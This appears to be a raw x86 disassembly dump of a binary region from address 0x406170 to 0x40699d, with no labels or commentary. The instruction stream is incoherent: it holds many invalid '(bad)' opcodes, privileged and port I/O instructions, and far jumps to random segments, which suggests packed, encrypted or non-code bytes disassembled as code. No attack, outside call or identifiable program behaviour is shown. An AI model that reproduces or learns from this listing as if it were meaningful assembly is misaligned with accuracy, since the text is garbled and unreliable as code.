  406170:	mov    WORD PTR [edx],gs
  406172:	jmp    0xdcd7:0x660ff043
  406179:	pop    esi
  40617a:	push   edx
  40617b:	(bad)  
  40617d:	cmp    cl,ch
  40617f:	lea    esp,[edi]
  406181:	(bad)  
  406182:	call   0x1ff7:0x60e4f88e
  406189:	adc    DWORD PTR ss:[ebp+eax*8+0x5c],edi
  40618e:	aam    0xa9
  406190:	lock addr16 mov eax,0xec5b6e14
  406197:	pop    ss
  406198:	mov    al,0xc9
  40619a:	xchg   edx,eax
  40619b:	push   esp
  40619c:	and    bh,ah
  40619e:	loopne 0x4061b2
  4061a0:	add    eax,0x6685c000
  4061a5:	call   0xf248f40e
  4061aa:	das    
  4061ab:	imul   BYTE PTR [ebp-0x67f38d8d]
  4061b1:	push   ebp
  4061b2:	pop    ebp
  4061b3:	hlt    
  4061b4:	repz data16 jb 0x40619c
  4061b8:	leave  
  4061b9:	push   esp
  4061ba:	in     al,dx
  4061bb:	das    
  4061bc:	mov    gs,WORD PTR [ecx+edi*2+0x5c79eed6]
  4061c3:	(bad)  
  4061c5:	cmp    BYTE PTR [ecx],bh
  4061c7:	sub    eax,0x8bebc063
  4061cc:	push   eax
  4061cd:	mov    ebp,0x38a55075
  4061d2:	mov    esp,0xf94a5ff8
  4061d7:	or     BYTE PTR [esi],bh
  4061d9:	(bad)  
  4061db:	enter  0xed34,0x12
  4061df:	push   0x5afd9c17
  4061e4:	mov    dl,0x60
  4061e6:	sub    al,BYTE PTR [ebp-0x80]
  4061e9:	sub    al,0xbe
  4061eb:	xchg   esp,eax
  4061ec:	add    BYTE PTR [ebx+0xf1941d],0x2d
  4061f3:	or     ecx,DWORD PTR [esp+ebx*8-0x6f]
  4061f7:	repnz dec ecx
  4061f9:	into   
  4061fa:	ja     0x406191
  4061fc:	std    
  4061fd:	lahf   
  4061fe:	xchg   ebx,eax
  4061ff:	mov    edx,0x3a0b87c5
  406204:	mov    esp,0xb4c773ad
  406209:	repnz cs adc al,0x15
  40620d:	push   edi
  40620e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40620f:	(bad)  
  406210:	daa    
  406211:	adc    esi,DWORD PTR [ebx+0x56a83415]
  406217:	push   cs
  406218:	leave  
  406219:	inc    ecx
  40621a:	jno    0x40621e
  40621c:	cmp    DWORD PTR [eax],ecx
  40621e:	mov    ds:0x572746ae,al
  406223:	int3   
  406224:	inc    edx
  406225:	retf   0x20ae
  406228:	cmp    BYTE PTR [edx-0x66],bh
  40622b:	push   edi
  40622c:	rol    BYTE PTR [edi+0x71],0x8d
  406230:	sub    ebx,DWORD PTR [ebx]
  406232:	xor    dl,0x3c
  406235:	add    eax,0xb4885b3
  40623a:	imul   edx,DWORD PTR [edi+0x74],0x18ee4a1e
  406241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406242:	outs   dx,BYTE PTR ds:[esi]
  406243:	jno    0x4062aa
  406245:	xor    BYTE PTR [ebp-0x61dc1fcf],dh
  40624b:	pop    esp
  40624c:	pop    esp
  40624d:	enter  0x4382,0x21
  406251:	adc    edi,DWORD PTR [edi-0x6035bc3b]
  406257:	or     al,0xaf
  406259:	sbb    dl,dl
  40625b:	jb     0x4062b5
  40625d:	mov    ah,BYTE PTR [ebx]
  40625f:	leave  
  406260:	mov    bl,BYTE PTR [ebp-0x7010fa21]
  406266:	cmp    eax,0xe1d37c16
  40626b:	and    ebp,edi
  40626d:	jge    0x406287
  40626f:	test   DWORD PTR [edx-0x6519e0df],esi
  406275:	fstp   QWORD PTR [eax]
  406277:	xchg   DWORD PTR [ebx+0x5b],esp
  40627a:	loopne 0x40624d
  40627c:	push   edx
  40627d:	jbe    0x406212
  40627f:	push   edi
  406280:	mov    dl,0x3c
  406282:	js     0x406299
  406284:	mov    eax,DWORD PTR [edx]
  406286:	(bad)  
  406287:	dec    ebx
  406289:	jle    0x40620c
  40628b:	(bad)  
  40628c:	scas   eax,DWORD PTR es:[edi]
  40628d:	mov    eax,ds:0x2dddc6cd
  406292:	wbinvd 
  406294:	rcr    DWORD PTR [ecx+0x10],cl
  406297:	in     al,dx
  406298:	pop    eax
  406299:	sub    al,0xa2
  40629b:	mov    esp,0xf3af2f74
  4062a0:	arpl   WORD PTR [eax+0x2c93cce],cx
  4062a6:	jmp    0x402458a
  4062ab:	inc    edx
  4062ac:	sub    esi,DWORD PTR [ecx-0x14]
  4062af:	inc    ecx
  4062b0:	and    BYTE PTR [edx+0x71d6687b],ah
  4062b6:	ret    0xd023
  4062b9:	sahf   
  4062ba:	mov    ecx,0x7f334f22
  4062bf:	mov    ds:0x32a93037,eax
  4062c4:	enter  0xc100,0xc6
  4062c8:	cmp    eax,0x5f424d15
  4062cd:	sub    eax,edi
  4062cf:	pop    ebp
  4062d0:	popf   
  4062d1:	cmp    eax,0xaa00eb1a
  4062d6:	mov    eax,ds:0x65136635
  4062db:	sbb    eax,0x53b0eecf
  4062e0:	sub    al,0x3f
  4062e2:	and    al,0xca
  4062e4:	loope  0x4062f1
  4062e6:	ret    0x4790
  4062e9:	mov    ds:0xd854baeb,eax
  4062ee:	inc    ebx
  4062ef:	adc    al,BYTE PTR cs:[ecx-0x58ce9308]
  4062f6:	add    esi,0x410984d
  4062fc:	(bad)  
  4062fe:	sbb    eax,0x14487685
  406303:	(bad)  
  406304:	jmp    0x4062f6
  406306:	mov    dl,0xd5
  406308:	dec    eax
  406309:	mov    cl,0x39
  40630b:	lahf   
  40630c:	int    0x44
  40630e:	and    ebp,esp
  406310:	fbstp  TBYTE PTR [ebx-0x435aba3a]
  406316:	ret    0x33c7
  406319:	(bad)  
  40631a:	out    0x1a,eax
  40631c:	rcl    BYTE PTR [edi-0x67ab4de8],cl
  406322:	pop    ecx
  406323:	dec    ebx
  406324:	xchg   BYTE PTR [edx],ch
  406326:	fnstcw WORD PTR [eax-0x4dfccff5]
  40632c:	idiv   ch
  40632e:	xor    BYTE PTR [ecx-0x72524100],cl
  406334:	sbb    edi,DWORD PTR [ebx+0x7772b3ec]
  40633a:	gs mov ebp,0x59d04dd6
  406340:	les    edx,FWORD PTR [eax]
  406342:	hlt    
  406343:	jb     0x4063af
  406345:	test   DWORD PTR [edi+0x5bf6e1ac],eax
  40634b:	fwait
  40634c:	push   ds
  40634d:	mov    esp,0x82fd3854
  406352:	cmc    
  406353:	test   al,0x85
  406355:	dec    edi
  406356:	push   ebp
  406357:	xchg   ebp,eax
  406358:	adc    al,0x76
  40635a:	sbb    esp,DWORD PTR [ebp-0x3]
  40635d:	fnstsw WORD PTR [esi+edi*2-0xc]
  406361:	xor    ecx,DWORD PTR [ecx-0x3]
  406364:	push   esp
  406365:	jmp    FWORD PTR [edi-0x4bbd6463]
  40636b:	adc    ah,ch
  40636d:	inc    edx
  40636e:	cmp    eax,0x1b8d983
  406373:	jmp    0x2039:0x4858a1
  40637a:	xchg   DWORD PTR [esi-0x5a71ea53],ecx
  406380:	fsub   QWORD PTR [ebx]
  406382:	sar    DWORD PTR [esp+edx*1+0x11],1
  406386:	sti    
  406387:	loopne 0x4063d3
  406389:	test   BYTE PTR [edi-0x6952d715],ah
  40638f:	clc    
  406390:	and    al,0xc7
  406392:	aaa    
  406393:	xor    bh,bl
  406395:	rcr    DWORD PTR [ebp-0x3ab07a6c],0x45
  40639c:	inc    esi
  40639d:	jbe    0x4063cc
  40639f:	clc    
  4063a0:	jl     0x4063e1
  4063a2:	or     bh,al
  4063a4:	mov    eax,DWORD PTR [eax]
  4063a6:	xor    ebp,esp
  4063a8:	push   es
  4063a9:	mov    edx,0xf2d129eb
  4063ae:	(bad)  
  4063af:	cld    
  4063b0:	pop    ds
  4063b1:	mov    bh,BYTE PTR [ecx]
  4063b3:	scas   eax,DWORD PTR es:[edi]
  4063b4:	add    esp,DWORD PTR [edx+0x2aee01]
  4063ba:	stc    
  4063bb:	out    0xcf,al
  4063bd:	out    0x95,al
  4063bf:	mul    DWORD PTR [ecx-0x63]
  4063c2:	lahf   
  4063c3:	xchg   ebx,eax
  4063c4:	mov    ds:0xbea7efc1,al
  4063c9:	pop    ds
  4063ca:	dec    ebx
  4063cb:	loopne 0x40637a
  4063cd:	inc    ebp
  4063ce:	out    dx,al
  4063cf:	or     DWORD PTR [ebx],ebx
  4063d1:	pop    esi
  4063d2:	inc    ebx
  4063d3:	imul   ecx,DWORD PTR [ebp-0x30820911],0xcfe473c2
  4063dd:	(bad)  
  4063de:	add    dh,dh
  4063e0:	imul   BYTE PTR [esi]
  4063e2:	sbb    al,0xa3
  4063e4:	mov    eax,ecx
  4063e6:	sbb    al,0xd4
  4063e8:	push   0x5fb52e2b
  4063ed:	sti    
  4063ee:	lds    ebp,FWORD PTR [ecx+0x47]
  4063f1:	or     BYTE PTR [ebp-0x5746055],dh
  4063f7:	fnsave ds:0x861e8b25
  4063fd:	and    BYTE PTR fs:[ecx+0x5b4943c6],0x20
  406405:	xor    DWORD PTR [edi+ebx*4+0x2d],0x2140f639
  40640d:	push   ebx
  40640e:	push   ecx
  40640f:	(bad)  [edi+0x6b]
  406412:	jge    0x4063bb
  406414:	das    
  406415:	xchg   BYTE PTR [ecx+0x42],cl
  406418:	mov    dh,0x30
  40641a:	imul   ch
  40641c:	ret    
  40641d:	mov    ds,WORD PTR [esi+0x39]
  406420:	cmp    BYTE PTR [eax+0x6f],ah
  406423:	hlt    
  406424:	and    eax,0x41434f77
  406429:	syscall 
  40642b:	pop    esi
  40642c:	enter  0x4709,0x92
  406430:	call   ebp
  406432:	push   0x890f1c83
  406437:	and    DWORD PTR [ecx+edi*8-0x6f618698],ecx
  40643e:	inc    eax
  40643f:	adc    al,0x72
  406441:	push   0xb5e22018
  406446:	sub    dl,bh
  406448:	add    al,0xee
  40644a:	inc    ebx
  40644b:	sub    al,0x57
  40644d:	test   al,0x79
  40644f:	push   ebp
  406450:	jmp    0xc1fd4ce9
  406455:	pusha  
  406456:	xchg   esi,eax
  406457:	stos   BYTE PTR es:[edi],al
  406458:	lahf   
  406459:	rol    DWORD PTR [edx],cl
  40645b:	mov    eax,0xd49d914f
  406460:	inc    ebx
  406461:	push   esi
  406462:	popa   
  406463:	pop    ebx
  406464:	test   edx,esp
  406466:	add    DWORD PTR [esi],ecx
  406468:	adc    al,0x5f
  40646a:	sub    ebp,ecx
  40646c:	xor    DWORD PTR [ebx],edi
  40646e:	jmp    0x2f3f8b5f
  406473:	adc    bl,dh
  406475:	bnd je 0x406428
  406478:	mov    bl,0x73
  40647a:	fsubr  DWORD PTR [edx-0x3e]
  40647d:	fucomp st(5)
  40647f:	or     dl,BYTE PTR [esi-0x3b]
  406482:	lea    ebx,[ecx+eiz*8+0x2cb1580d]
  406489:	into   
  40648a:	xchg   esi,eax
  40648b:	les    di,DWORD PTR [ecx+0x10]
  40648f:	sar    bl,1
  406491:	stc    
  406492:	push   ecx
  406493:	xchg   esp,eax
  406494:	pop    edi
  406495:	dec    edi
  406496:	and    eax,0x6bfd3572
  40649b:	dec    ebx
  40649c:	pop    es
  40649d:	cmp    DWORD PTR [ebx+0x23],esp
  4064a0:	jns    0x406513
  4064a2:	jns    0x4064cc
  4064a4:	fcmovne st,st(6)
  4064a6:	xor    al,0x2
  4064a8:	es cmp bl,0xaa
  4064ac:	arpl   WORD PTR [edx-0x75],si
  4064af:	mov    al,ds:0x54a6b177
  4064b4:	xor    DWORD PTR [edi+0x57e39b13],0x45
  4064bb:	adc    eax,0x91b6da1f
  4064c0:	push   cs
  4064c1:	xor    ecx,DWORD PTR [edx]
  4064c3:	leave  
  4064c4:	sbb    DWORD PTR [ebp+eax*2-0x10459931],esp
  4064cb:	lahf   
  4064cc:	fldenv [ecx+0x44]
  4064cf:	inc    edx
  4064d0:	fisubr WORD PTR [ebx+0x5b]
  4064d3:	cmp    al,dl
  4064d5:	mov    eax,ds:0x3c7a2a0a
  4064da:	retf   
  4064db:	aad    0x57
  4064dd:	popa   
  4064de:	xor    DWORD PTR [edx-0x3c616837],0x918619fc
  4064e8:	retf   
  4064e9:	clc    
  4064ea:	push   cs
  4064eb:	mov    esi,0x9b0b0626
  4064f0:	pop    ebx
  4064f1:	sti    
  4064f2:	fucomip st,st(2)
  4064f4:	mov    ebx,0xff8ea0e7
  4064f9:	push   ss
  4064fa:	in     al,0x98
  4064fc:	jmp    0x4064f8
  4064fe:	daa    
  4064ff:	ss retf 
  406501:	dec    ebx
  406502:	mov    esi,0x83bb01d2
  406507:	push   ss
  406508:	addr16 sub ch,cl
  40650b:	pop    ebx
  40650c:	mov    ch,0xe1
  40650e:	rcl    BYTE PTR [esi-0x46e5efde],1
  406514:	and    bl,BYTE PTR [ecx]
  406516:	and    eax,0x20a5884a
  40651b:	jbe    0x406564
  40651d:	add    al,0xc2
  40651f:	jecxz  0x4064ce
  406521:	xchg   ebp,eax
  406522:	inc    esp
  406523:	out    0x6d,al
  406525:	ud2    
  406527:	cmp    al,0x22
  406529:	sahf   
  40652a:	shl    al,1
  40652c:	loope  0x406504
  40652e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40652f:	pusha  
  406530:	inc    esp
  406531:	in     eax,0x88
  406533:	pop    ebp
  406534:	mov    bh,al
  406536:	mov    al,ds:0xacadcd9e
  40653b:	and    esi,DWORD PTR fs:[ebx]
  40653e:	push   ecx
  40653f:	stos   BYTE PTR es:[edi],al
  406540:	sbb    bl,dh
  406542:	aaa    
  406543:	(bad)  
  406544:	push   eax
  406546:	xchg   edi,eax
  406547:	xor    BYTE PTR [eax],al
  406549:	fs push 0x1b
  40654c:	dec    ecx
  40654e:	mov    edx,0xa2db3bfe
  406553:	arpl   WORD PTR [ecx-0x4bf61d4],bx
  406559:	data16 loop 0x406597
  40655c:	std    
  40655d:	inc    ecx
  40655e:	dec    esi
  40655f:	popa   
  406560:	sub    eax,0xf9bfc19d
  406565:	or     al,0x4c
  406567:	std    
  406568:	lahf   
  406569:	in     eax,dx
  40656a:	or     bl,BYTE PTR [eax+ebp*2]
  40656d:	ror    DWORD PTR [edx-0x33],0x93
  406571:	or     esi,DWORD PTR [eax]
  406573:	cvttps2pi mm7,QWORD PTR ds:0xb394fbea
  40657a:	xchg   esp,eax
  40657b:	pcmpgtd mm4,mm5
  40657e:	xor    eax,0xaeeb1faf
  406583:	mov    al,ds:0x1f920404
  406588:	lods   eax,DWORD PTR ds:[esi]
  406589:	rcr    DWORD PTR [edx-0x337a2c1e],1
  40658f:	pop    eax
  406590:	fild   WORD PTR [edx]
  406592:	sub    al,0xa1
  406594:	cmp    BYTE PTR [edx+0x58],cl
  406597:	pop    DWORD PTR [edx+edi*4-0x5eb2bd4f]
  40659e:	sbb    esp,edx
  4065a0:	mov    cl,0x81
  4065a2:	sub    BYTE PTR [eax-0x9],cl
  4065a5:	mov    ecx,0x8948da5
  4065aa:	pop    eax
  4065ab:	sbb    edx,DWORD PTR [edi]
  4065ad:	pop    ecx
  4065ae:	ja     0x4065b6
  4065b0:	loope  0x4065e9
  4065b2:	(bad)  
  4065b3:	in     eax,dx
  4065b4:	ror    DWORD PTR [ebx],cl
  4065b6:	sub    ecx,DWORD PTR [edx-0x16764807]
  4065bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065bd:	xor    BYTE PTR [edi-0x496d716a],cl
  4065c3:	in     al,dx
  4065c4:	xchg   BYTE PTR [ebp+0x30],dl
  4065c7:	and    al,bl
  4065c9:	mov    BYTE PTR [edi+ecx*2],ah
  4065cc:	sbb    BYTE PTR cs:0x83fc1384,dh
  4065d3:	adc    edx,DWORD PTR [edx-0x1ad3bcb]
  4065d9:	add    BYTE PTR [ebp-0x51],cl
  4065dc:	fbstp  TBYTE PTR [eax]
  4065de:	or     BYTE PTR [esi],0xad
  4065e1:	pop    eax
  4065e2:	sbb    ebp,esi
  4065e4:	daa    
  4065e5:	push   0x19a7914c
  4065ea:	jp     0x40664b
  4065ec:	stos   DWORD PTR es:[edi],eax
  4065ed:	sti    
  4065ee:	cs push 0xffffff8d
  4065f1:	jmp    0x4065ff
  4065f3:	sti    
  4065f4:	xchg   edi,eax
  4065f5:	int    0x3d
  4065f7:	aad    0x42
  4065f9:	std    
  4065fa:	mov    ebx,0xb499acdb
  4065ff:	ret    0xfa5d
  406602:	inc    edx
  406603:	add    bh,al
  406605:	icebp  
  406606:	rcl    BYTE PTR [edi-0x418b8fc8],0xc0
  40660d:	xor    ebp,DWORD PTR [esi]
  40660f:	or     edx,DWORD PTR [ebp-0x5a02cff7]
  406615:	or     al,0xb4
  406617:	mov    eax,ds:0xb10ecda1
  40661c:	fcmovb st,st(5)
  40661e:	test   bl,cl
  406620:	cmp    cl,ch
  406622:	jae    0x4065fa
  406624:	adc    DWORD PTR [edi],esi
  406626:	inc    ebx
  406627:	add    eax,0x216560b2
  40662c:	sbb    bl,ah
  40662e:	mov    edx,DWORD PTR [esi]
  406630:	pop    esi
  406631:	dec    edx
  406632:	rol    BYTE PTR [ecx+0x51],0x65
  406636:	retf   
  406637:	push   ds
  406638:	fmul   QWORD PTR [eax]
  40663a:	loopne 0x4065e5
  40663c:	call   0xfa5b:0x5d10a557
  406643:	sub    DWORD PTR [edi+0x7bf69d37],0xffffffa3
  40664a:	lahf   
  40664b:	cdq    
  40664c:	add    dl,BYTE PTR [ecx]
  40664e:	xor    ecx,esi
  406650:	xor    DWORD PTR ss:[ebp+0x8],0xffffff9c
  406655:	adc    BYTE PTR [ebp-0x68],cl
  406658:	xor    DWORD PTR [ebx+0x9],ecx
  40665b:	cli    
  40665c:	inc    edx
  40665d:	ss stc 
  40665f:	sbb    eax,0xe77e2250
  406664:	cwde   
  406665:	pop    ecx
  406666:	pop    eax
  406667:	jle    0x40669d
  406669:	pusha  
  40666a:	cmp    dh,dh
  40666c:	jb     0x4065f0
  40666e:	mov    bl,0xfa
  406670:	pop    ebx
  406671:	adc    eax,0xc79a563e
  406676:	sub    eax,0x9b14055e
  40667b:	sbb    dh,bl
  40667d:	adc    DWORD PTR [edi+0x11b10889],edi
  406683:	xchg   ebp,eax
  406684:	dec    ebx
  406685:	sysexit 
  406687:	test   DWORD PTR [esp+eax*1+0x70],edi
  40668b:	xchg   ebx,eax
  40668c:	imul   edi,DWORD PTR [eax],0xffffffd7
  40668f:	div    DWORD PTR [esi+0x69]
  406692:	mov    dl,0x2
  406694:	pop    ebx
  406695:	test   BYTE PTR [edx+0x134a50c5],0xb6
  40669c:	or     DWORD PTR [ebx-0x60],esi
  40669f:	sub    dh,BYTE PTR [esi]
  4066a1:	stc    
  4066a2:	sub    DWORD PTR [ecx-0x6e],0xb44c3589
  4066a9:	pop    ds
  4066aa:	call   0xacd2:0x6f0ef06a
  4066b1:	retf   
  4066b2:	mov    BYTE PTR [ebp+0x1a99c044],dl
  4066b8:	xlat   BYTE PTR ds:[ebx]
  4066b9:	mov    edx,0x180ad3a1
  4066be:	int3   
  4066bf:	out    dx,al
  4066c0:	imul   ebx,DWORD PTR [ebx],0xbee8f049
  4066c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066c7:	ret    0xd897
  4066ca:	ror    DWORD PTR [ecx-0x52e94256],0x98
  4066d1:	adc    eax,0xe8114f0
  4066d6:	sub    DWORD PTR ds:0xbfa60762,esi
  4066dc:	(bad)  
  4066dd:	imul   edx,DWORD PTR [esi+0x2],0x55
  4066e1:	cmp    ecx,ebp
  4066e3:	sub    bh,ch
  4066e5:	jecxz  0x40669e
  4066e7:	ficomp DWORD PTR [eax+ebp*2+0x5c639538]
  4066ee:	bound  esp,QWORD PTR [edx+0x744da37f]
  4066f4:	push   0xffffffc6
  4066f6:	mov    esi,0xf3c71028
  4066fb:	mov    ebp,0xe479c13f
  406700:	loopne 0x406698
  406702:	loopne 0x40675f
  406704:	lds    edx,FWORD PTR [eax+eiz*4+0x6]
  406708:	jle    0x4066c6
  40670a:	or     ebp,DWORD PTR [ecx]
  40670c:	xor    al,0x38
  40670e:	pop    ecx
  40670f:	inc    BYTE PTR [ebp+0x1b]
  406712:	out    0x99,al
  406714:	je     0x4066c7
  406716:	pop    edx
  406717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406718:	sahf   
  406719:	mov    ch,0x30
  40671b:	ror    DWORD PTR [ecx],0x10
  40671e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40671f:	hlt    
  406720:	pushf  
  406721:	xor    edx,esp
  406723:	and    al,0x6
  406725:	mov    esi,0x7ae5cc14
  40672a:	in     eax,0xac
  40672c:	enter  0xf9d,0xb9
  406730:	pop    es
  406731:	jno    0x4067a8
  406733:	aas    
  406734:	jns    0x40670b
  406736:	std    
  406737:	push   ds
  406738:	push   ss
  406739:	xor    ch,dl
  40673b:	sbb    edi,esi
  40673d:	mov    ch,0x96
  40673f:	popf   
  406740:	or     edx,DWORD PTR [edx-0x3dfce648]
  406746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406747:	adc    ecx,0xdd71ee0e
  40674d:	pushf  
  40674e:	push   eax
  40674f:	mov    esi,DWORD PTR [edx]
  406751:	js     0x40675d
  406753:	leave  
  406754:	dec    edx
  406755:	add    BYTE PTR [esi+0x3f5f993a],0x8f
  40675c:	adc    al,0x1c
  40675e:	ins    BYTE PTR es:[edi],dx
  40675f:	xor    BYTE PTR [edi-0x1b908464],dl
  406765:	jo     0x4066f7
  406767:	dec    ebx
  406768:	rcl    DWORD PTR [edi+eiz*2-0x34],cl
  40676c:	sbb    DWORD PTR [esp+eiz*8+0x6e4b7777],eax
  406773:	push   edx
  406774:	cmp    al,0xf4
  406776:	call   0x84112581
  40677b:	xchg   ebp,esp
  40677d:	sub    BYTE PTR [ebp+0xb],cl
  406780:	cwde   
  406781:	mov    WORD PTR [ebx+0x7a249f7c],fs
  406787:	xchg   ebx,eax
  406788:	lahf   
  406789:	ficom  DWORD PTR [esi]
  40678b:	addr16 xbegin 0xccc1fd87
  406792:	idiv   DWORD PTR [edi-0x5f]
  406795:	jne    0x406742
  406797:	rol    DWORD PTR [eax+0x17],0x10
  40679b:	xchg   esi,eax
  40679c:	outs   dx,BYTE PTR ds:[esi]
  40679d:	fadd   DWORD PTR ds:0xdbdb781c
  4067a3:	cmc    
  4067a4:	xchg   ecx,eax
  4067a5:	sub    ebp,DWORD PTR [edx-0x76]
  4067a8:	fstp   TBYTE PTR [edi]
  4067aa:	fsubr  QWORD PTR [edi]
  4067ac:	shl    DWORD PTR [eax],0xba
  4067af:	imul   edi,DWORD PTR [edi],0xdbd38a35
  4067b5:	icebp  
  4067b6:	inc    ecx
  4067b7:	push   ss
  4067b8:	inc    eax
  4067b9:	bound  edi,QWORD PTR [esi-0x48]
  4067bc:	lods   eax,DWORD PTR ds:[esi]
  4067bd:	sub    dl,BYTE PTR ds:0x60aedef5
  4067c3:	(bad)  
  4067c4:	cmp    DWORD PTR [ebx+0x29],edi
  4067c7:	jo     0x4067bf
  4067c9:	jo     0x406761
  4067cb:	stc    
  4067cc:	cmp    BYTE PTR [ebx],cl
  4067ce:	add    BYTE PTR [ecx],ah
  4067d0:	push   edx
  4067d1:	stc    
  4067d2:	lods   al,BYTE PTR ds:[esi]
  4067d3:	aaa    
  4067d4:	scas   al,BYTE PTR es:[edi]
  4067d5:	and    al,0x4e
  4067d7:	jl     0x40678c
  4067d9:	int    0xd0
  4067db:	add    al,0x4a
  4067dd:	in     eax,dx
  4067de:	mov    cl,0xdf
  4067e0:	inc    ecx
  4067e1:	aam    0xda
  4067e3:	adc    eax,0x9e73485f
  4067e8:	jp     0x406836
  4067ea:	xor    al,0x8a
  4067ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067ed:	aad    0x9a
  4067ef:	cmp    ah,bl
  4067f1:	loope  0x40680e
  4067f3:	enter  0x17bd,0x15
  4067f7:	xchg   ebx,eax
  4067f8:	aad    0x7
  4067fa:	sbb    al,0xa6
  4067fc:	jmp    0x40686b
  4067fe:	push   0xffffffc9
  406800:	sub    BYTE PTR [ebp-0x46ca1e7b],dh
  406806:	mov    ch,bh
  406808:	fsubr  QWORD PTR [ecx+0x4c]
  40680b:	repz (bad) 
  40680d:	hlt    
  40680e:	adc    dl,BYTE PTR [eax-0x38]
  406811:	adc    DWORD PTR [eax+0x51],edx
  406814:	mov    eax,0x312f4cb1
  406819:	jno    0x4067d5
  40681b:	das    
  40681c:	sahf   
  40681d:	imul   esp,DWORD PTR [ebx-0x184acab2],0xffffffd7
  406824:	add    al,0x78
  406826:	add    eax,0x572ab144
  40682b:	mov    edi,0x7f4e52da
  406830:	xchg   ecx,eax
  406831:	mov    ecx,0xdd5e3561
  406836:	cmp    eax,0x35fe4191
  40683b:	mov    eax,ds:0xd06ebc33
  406840:	call   0x83c11cf0
  406845:	cs mov dl,0xb3
  406848:	mov    dl,0xe1
  40684a:	ds push ss
  40684c:	rcr    BYTE PTR [ebp-0x385235bb],0x38
  406853:	out    0x7a,eax
  406855:	scas   eax,DWORD PTR es:[edi]
  406856:	mov    al,0xa4
  406858:	adc    DWORD PTR [esi+0x79],ebx
  40685b:	push   ecx
  40685c:	repz pop esp
  40685e:	fst    QWORD PTR [esi-0x52]
  406861:	jp     0x4067ff
  406863:	push   cs
  406864:	cld    
  406865:	jmp    0x3a4362e2
  40686a:	pop    ss
  40686b:	lea    eax,[ebx+0x5d8a3cf3]
  406871:	jno    0x4068b5
  406873:	adc    esp,DWORD PTR [ebx-0x44ad2069]
  406879:	and    al,0x60
  40687b:	int    0x8d
  40687d:	fnsave [esi-0x34f3a8a1]
  406883:	clc    
  406884:	mov    dl,0x5b
  406886:	(bad)
  406889:	push   ebx
  40688a:	and    al,BYTE PTR ds:[ecx+0x1556dcef]
  406891:	push   esi
  406892:	dec    esi
  406893:	xchg   ecx,eax
  406894:	ins    BYTE PTR es:[edi],dx
  406895:	fbstp  TBYTE PTR [esi+0x49]
  406898:	mov    ch,0x7f
  40689a:	sbb    eax,0x6f08523b
  40689f:	or     eax,0x4ea43899
  4068a4:	push   ds
  4068a5:	(bad)  
  4068a6:	es xor al,0x97
  4068a9:	aaa    
  4068aa:	mov    esi,0x5385856b
  4068af:	cmp    dh,dl
  4068b1:	nop
  4068b2:	add    esi,DWORD PTR [esi+0x52c16255]
  4068b8:	and    BYTE PTR [esi],ah
  4068ba:	push   eax
  4068bb:	mov    BYTE PTR [edi],bl
  4068bd:	icebp  
  4068be:	xchg   BYTE PTR [esi+0xb],bh
  4068c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c2:	test   al,0x33
  4068c4:	fstp   TBYTE PTR [edx-0x715abb1c]
  4068ca:	pop    DWORD PTR [esi+0x6378a2fe]
  4068d0:	mul    dl
  4068d2:	adc    BYTE PTR [eax-0x36],0x11
  4068d6:	sti    
  4068d7:	adc    ch,BYTE PTR [ebp+0x7d]
  4068da:	cmp    BYTE PTR [esi-0x79],bl
  4068dd:	adc    al,0x7a
  4068df:	pop    ebp
  4068e0:	mov    edx,0x46dcb04b
  4068e5:	loope  0x406876
  4068e7:	ret    
  4068e8:	mov    ebx,0x54b22432
  4068ed:	into   
  4068ee:	iret   
  4068ef:	adc    BYTE PTR [ebx-0x35e0a7c8],ah
  4068f5:	lea    esp,[edx-0xc4d2059]
  4068fb:	(bad)  
  4068fc:	cmp    eax,edx
  4068fe:	dec    eax
  4068ff:	xor    al,BYTE PTR [edi]
  406901:	add    DWORD PTR [edi],ebp
  406903:	sbb    BYTE PTR [esi+esi*8-0x4d],0xb8
  406908:	repz push ebp
  40690a:	adc    bh,BYTE PTR [ecx+0x12543bb3]
  406910:	mov    bh,0xc2
  406912:	repz addr16 call 0x96443bbe
  406919:	(bad)  
  40691a:	cmp    esi,esp
  40691c:	scas   eax,DWORD PTR es:[edi]
  40691d:	sbb    DWORD PTR [ebx+0x5e8ef0c0],edx
  406923:	ins    BYTE PTR es:[edi],dx
  406924:	inc    esi
  406925:	jl     0x4068b3
  406927:	and    ah,bh
  406929:	cli    
  40692a:	pop    edi
  40692b:	scas   al,BYTE PTR es:[edi]
  40692c:	test   al,0x82
  40692e:	daa    
  40692f:	outs   dx,DWORD PTR ds:[esi]
  406930:	pop    edx
  406931:	sbb    al,0xf
  406933:	add    al,0xe3
  406935:	enter  0x46ff,0x3d
  406939:	push   ss
  40693a:	mov    cl,0x66
  40693c:	cli    
  40693d:	cs arpl WORD PTR cs:[ebx+0x3d9c3c09],si
  406945:	push   esi
  406946:	in     al,dx
  406947:	pusha  
  406948:	pusha  
  406949:	push   ecx
  40694a:	jmp    0x40695e
  40694c:	out    0x83,al
  40694e:	out    0xb4,eax
  406950:	xor    dh,dh
  406952:	add    al,0xa7
  406955:	cmp    edi,DWORD PTR [esi-0x78]
  406958:	mov    edx,edi
  40695a:	int    0xb8
  40695c:	int3   
  40695d:	mov    WORD PTR [eax],fs
  40695f:	dec    esp
  406960:	mov    esp,0xbedcb2
  406965:	hlt    
  406966:	hlt    
  406967:	and    eax,0x4e495cdc
  40696c:	fcomp  DWORD PTR [eax+0x2f]
  40696f:	pop    edx
  406970:	lea    edx,[edx]
  406972:	in     eax,dx
  406973:	push   0x845643e1
  406978:	sub    eax,edi
  40697a:	mov    ch,0x14
  40697c:	xchg   DWORD PTR [ebp-0x7b],ebp
  40697f:	sahf   
  406980:	jns    0x406976
  406982:	pop    ss
  406983:	jno    0x406959
  406985:	sub    BYTE PTR [edi+0x5d],ch
  406988:	cmp    dl,BYTE PTR [ebx-0x601a9bee]
  40698e:	bound  esp,QWORD PTR [ebx+ebx*2+0xcb78e40]
  406995:	std    
  406996:	push   ss
  406997:	mov    ecx,0x359ce046
  40699c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40699d:	mov    dh,BYTE PTR [eax+edx*8-0x151ef297]
